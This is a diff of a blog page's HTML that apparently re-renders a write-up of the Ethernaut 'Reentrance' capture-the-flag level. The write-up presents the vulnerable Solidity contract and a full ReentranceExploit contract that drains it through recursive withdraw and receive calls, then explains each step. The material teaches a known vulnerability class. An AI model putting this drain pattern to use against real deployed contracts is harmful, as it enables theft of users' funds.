@@ -82,26 +82,22 @@ of it that:">
 <link rel="preload" href="https://vyorkin.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="preload" href="https://vyorkin.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
 
-
-  
-  
-  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.07092c1350ffd254998dc43a44ae96e617d14af4df4602626878df89189c5e1a.css" integrity="sha256-BwksE1D/0lSZjcQ6RK6W5hfRSvTfRgJiaHjfiRicXho=" crossorigin="anonymous" media="screen" />
-
-
-
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
 
 
   
-    
-    
-    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
   
+  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.070807f22ed87a923883f1a61d2e227d67d923b7fa424ed9a2bf875f4949406e.css" integrity="sha256-BwgH8i7YepI4g/GmHS4ifWfZI7f6Qk7Zor&#43;HX0lJQG4=" crossorigin="anonymous" media="screen" />
+
+
+
+
 
 
 
 
   
-  <link rel="stylesheet" href="https://vyorkin.org/custom.min.cf4424ca575c8638b55547ace7bc3ab68c44ff1c808b1f1bb2358cdbcdbd8c41.css" integrity="sha256-z0Qkyldchji1VUes57w6toxE/xyAix8bsjWM2829jEE=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://vyorkin.org/custom.min.e79d44f53b0c4396d73bb2d809d0abbfb31a859a259ae12ed5d6c3a2af56d353.css" integrity="sha256-551E9TsMQ5bXO7LYCdCrv7MahZolmuEu1dbDoq9W01M=" crossorigin="anonymous" media="screen" />
 
 
 <link rel="icon" type="image/svg+xml" href="https://vyorkin.org/images/favicon.svg" sizes="any">
@@ -127,9 +123,7 @@ of it that:">
 
 
 
-
-
-<body class="preload-transitions colorscheme-auto">
+<body class="preload-transitions colorscheme-light">
   
 <div class="float-container">
     <a id="dark-mode-toggle" class="colorscheme-toggle">
@@ -168,8 +162,6 @@ of it that:">
           
           
             
-          
-            
               
                 <li class="navigation-item menu-separator">
                   <span>|</span>
@@ -179,6 +171,8 @@ of it that:">
               <li class="navigation-item">
                 <a href="https://vyorkin.org/ru-ru/">ru</a>
               </li>
+            
+          
             
           
             
@@ -239,35 +233,35 @@ of it that:">
         
         <p>The objective of this challenge is to steal all the funds from
 the contract.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#007f7f">// SPDX-License-Identifier: MIT
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">pragma solidity</span> ^<span style="color:#ff0;font-weight:bold">0</span>.<span style="color:#ff0;font-weight:bold">8</span>.<span style="color:#ff0;font-weight:bold">2</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> Reentrance {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">mapping</span>(<span style="color:#fff;font-weight:bold">address</span> =&gt; <span style="color:#fff;font-weight:bold">uint256</span>) <span style="color:#fff;font-weight:bold">public</span> balances;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> donate(<span style="color:#fff;font-weight:bold">address</span> _to) <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>        balances[_to] += <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> balanceOf(<span style="color:#fff;font-weight:bold">address</span> _who) <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">view</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">balance</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> balances[_who];
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> withdraw(<span style="color:#fff;font-weight:bold">uint256</span> _amount) <span style="color:#fff;font-weight:bold">public</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] &gt;= _amount) {
-</span></span><span style="display:flex;"><span>            (<span style="color:#fff;font-weight:bold">bool</span> result, ) = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>.<span style="color:#fff;font-weight:bold">call</span>{<span style="color:#fff;font-weight:bold">value</span>: _amount}(<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> (result) {
-</span></span><span style="display:flex;"><span>                _amount;
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">unchecked</span> {
-</span></span><span style="display:flex;"><span>                balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] -= _amount;
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    receive() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {}
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Reentrance</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="n">balances</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">donate</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">_who</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="nb">balance</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">balances</span><span class="p">[</span><span class="n">_who</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">_amount</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">bool</span> <span class="n">result</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">_amount</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="kr">unchecked</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>Originally this level had the <code>pragma solidity ^0.6.0</code> and used the
 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath"  class="external-link" target="_blank" rel="noopener">SafeMath</a>
 from OpenZeppelin, which provides wrappers over Solidity’s
@@ -291,7 +285,7 @@ at any time.</p>
 <p><strong>State</strong></p>
 <p>The <code>balances</code> state variable is used to track
 user&rsquo;s donations:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">mapping</span>(<span style="color:#fff;font-weight:bold">address</span> =&gt; <span style="color:#fff;font-weight:bold">uint256</span>) <span style="color:#fff;font-weight:bold">public</span> balances;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="n">balances</span><span class="p">;</span>
 </span></span></code></pre></div><p><strong>Functions</strong></p>
 <ul>
 <li><code>balanceOf</code> &ndash; Gets the amount donated by the given address.</li>
@@ -303,24 +297,23 @@ the <code>donate</code> function. It may be needed to setup the
 we have something to steal) or just in order to divert our
 attention 🙃</li>
 </ul>
-<p>As the name of the level suggests, this contract should be prone
-to the
+<p>As the name of the level suggests, this contract should be prone to the
 <a href="https://docs.soliditylang.org/en/latest/security-considerations.html#re-entrancy"  class="external-link" target="_blank" rel="noopener">Re-entrancy</a>
-attack (when you know the name of the vulnerability it is
-relatively simple to find it 😏). The <code>donate</code> function is
-trivial, so let&rsquo;s concentrate on the <code>withdraw</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> withdraw(<span style="color:#fff;font-weight:bold">uint256</span> _amount) <span style="color:#fff;font-weight:bold">public</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] &gt;= _amount) {
-</span></span><span style="display:flex;"><span>        (<span style="color:#fff;font-weight:bold">bool</span> result, ) = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>.<span style="color:#fff;font-weight:bold">call</span>{<span style="color:#fff;font-weight:bold">value</span>: _amount}(<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (result) {
-</span></span><span style="display:flex;"><span>            _amount;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">unchecked</span> {
-</span></span><span style="display:flex;"><span>            balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] -= _amount;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
+attack (when you know the name of the vulnerability it is relatively simple to
+find it 😏). The <code>donate</code> function is trivial, so let&rsquo;s concentrate on the
+<code>withdraw</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">_amount</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">result</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">_amount</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kr">unchecked</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>This function updates the internal state after sending funds. It
 neither follows the
 <a href="https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern"  class="external-link" target="_blank" rel="noopener">Checks-Effects-Interactions</a>
@@ -344,52 +337,52 @@ sequenceDiagram
     participant E as Exploit
     participant R as Reentrance
 
-E->>R: donate()
-R-->>E: success
-E->>R: withdraw()
-R-->>E: receive()
-E->>R: withdraw()
-R-->>E: receive()
-E->>R: ...
-Note right of R: until address(Reentrance).balance > 0
-E->>R: withdraw()
-R->>R: balances[msg.sender] -= amount
+E-&gt;&gt;R: donate()
+R--&gt;&gt;E: success
+E-&gt;&gt;R: withdraw()
+R--&gt;&gt;E: receive()
+E-&gt;&gt;R: withdraw()
+R--&gt;&gt;E: receive()
+E-&gt;&gt;R: ...
+Note right of R: until address(Reentrance).balance &gt; 0
+E-&gt;&gt;R: withdraw()
+R-&gt;&gt;R: balances[msg.sender] -= amount
 
 </div>
 
 
 <p>Let&rsquo;s craft such a malicious contract:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> ReentranceExploit {
-</span></span><span style="display:flex;"><span>    Reentrance <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">immutable</span> level;
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">immutable</span> owner;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(Reentrance _level) {
-</span></span><span style="display:flex;"><span>        level = _level;
-</span></span><span style="display:flex;"><span>        owner = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> withdraw() <span style="color:#fff;font-weight:bold">public</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">balance</span> = <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span>;
-</span></span><span style="display:flex;"><span>        (<span style="color:#fff;font-weight:bold">bool</span> success, ) = owner.<span style="color:#fff;font-weight:bold">call</span>{<span style="color:#fff;font-weight:bold">value</span>: <span style="color:#fff;font-weight:bold">balance</span>}(<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">require</span>(success, <span style="color:#0ff;font-weight:bold">&#34;unable to withdraw&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> run() <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>        level.donate{<span style="color:#fff;font-weight:bold">value</span>: <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>}(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
-</span></span><span style="display:flex;"><span>        level.withdraw(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    receive() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> levelBalance = <span style="color:#fff;font-weight:bold">address</span>(level).<span style="color:#fff;font-weight:bold">balance</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (levelBalance &gt; <span style="color:#ff0;font-weight:bold">0</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span> &lt; levelBalance) {
-</span></span><span style="display:flex;"><span>                level.withdraw(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>);
-</span></span><span style="display:flex;"><span>            } <span style="color:#fff;font-weight:bold">else</span> {
-</span></span><span style="display:flex;"><span>                level.withdraw(levelBalance);
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">ReentranceExploit</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Reentrance</span> <span class="k">private</span> <span class="k">immutable</span> <span class="n">level</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">private</span> <span class="k">immutable</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="n">Reentrance</span> <span class="n">_level</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">level</span> <span class="o">=</span> <span class="n">_level</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="nb">balance</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">owner</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">balance</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;unable to withdraw&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">level</span><span class="p">.</span><span class="n">donate</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">level</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">levelBalance</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">level</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">levelBalance</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&lt;</span> <span class="n">levelBalance</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">level</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">level</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="n">levelBalance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>It has 3 functions:</p>
 <ul>
 <li><code>run</code> &ndash; Runs the exploit.</li>
@@ -403,132 +396,132 @@ R->>R: balances[msg.sender] -= amount
 amount we just deposited. This tiggers a chain of the <code>withdraw</code>-<code>receive</code> calls.</li>
 </ul>
 <!--listend-->
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> run() <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>    level.donate{<span style="color:#fff;font-weight:bold">value</span>: <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>}(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
-</span></span><span style="display:flex;"><span>    level.withdraw(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>);
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">level</span><span class="p">.</span><span class="n">donate</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">level</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>Our <code>receive</code> function calculates the amount funds left in the
 <code>Reentrance</code> contract and re-enters it with the <code>level.withdraw</code>
 call:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>receive() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> levelBalance = <span style="color:#fff;font-weight:bold">address</span>(level).<span style="color:#fff;font-weight:bold">balance</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (levelBalance &gt; <span style="color:#ff0;font-weight:bold">0</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span> &lt; levelBalance) {
-</span></span><span style="display:flex;"><span>            level.withdraw(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>);
-</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">else</span> {
-</span></span><span style="display:flex;"><span>            level.withdraw(levelBalance);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">levelBalance</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">level</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">levelBalance</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&lt;</span> <span class="n">levelBalance</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">level</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">level</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="n">levelBalance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>We can withdraw at most what we&rsquo;ve donated. If there is less
 Ether left, then we just withdraw the rest.</p>
 <p>The <code>withdraw</code> function sends the stolen funds back to the
 attacker (player):</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> withdraw() <span style="color:#fff;font-weight:bold">public</span> {
